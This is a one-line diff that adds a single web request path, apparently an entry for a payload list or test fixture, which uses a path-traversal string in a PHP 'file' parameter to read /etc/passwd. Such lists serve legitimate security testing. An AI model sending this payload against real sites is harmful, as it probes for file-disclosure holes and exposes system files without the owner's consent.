@@ -1,0 +1,1 @@
+/index.php?id=50&file=../../../../../../../../../etc/passwd
